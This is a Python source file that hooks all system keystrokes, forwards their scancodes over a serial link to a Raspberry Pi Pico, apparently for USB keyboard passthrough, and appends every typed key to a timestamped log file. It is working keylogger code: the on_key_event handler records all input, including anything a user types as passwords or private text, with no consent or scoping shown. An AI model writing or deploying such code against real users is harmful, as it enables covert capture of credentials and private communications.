'''
This file is used to Log the key inputs and send the keycodes to the raspberry pi pico
'''
from usb_packets import scancode_to_packet
import threading
import os
import keyboard as k
import datetime
from convert_keys_to_packets import convert_scancodes_to_packets
import serial
SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
NULL_CHAR = chr(0)
path_log = f"{SCRIPT_PATH}/Log.txt"

serial_port = r'/dev/ttyS0'
#def write_report(report):
#    with open('/dev/hidg0', 'rb+') as fd:
#        fd.write(report.encode())
ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
def on_key_event(e):


    pressed_events = k._pressed_events
    print(pressed_events)
    scancodes = [str(int(scancode_to_packet[event])) for event in pressed_events if pressed_events[event].event_type=="down"]

    #package_to_send = convert_scancodes_to_packets(scancodes=scancodes)
    try:
        if scancodes:
            ser.write((",".join(scancodes)+",\n").encode("utf-8"))

        else:
            ser.write("0,\n".encode("utf-8"))


    except KeyboardInterrupt:
        raise Exception("execution stopped")
    except Exception as e:
        print("couldn't send data", e)

    if e.event_type == k.KEY_DOWN:


        with open(path_log, "a") as log:
            try:
                if len(e.name) > 1 and e.name != "space":
                    log.write(f"[{e.name}]")
                elif e.name == "space":
                    log.write(" ")
                else:
                    log.write(e.name)
            except Exception as ex:
                log.write(f"Error writing event to log: {str(ex)}")



def setup():
    with open(path_log, "a") as log:
        log.write(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
if __name__ == "__main__":

        setup()



        k.hook(on_key_event)
        k.wait()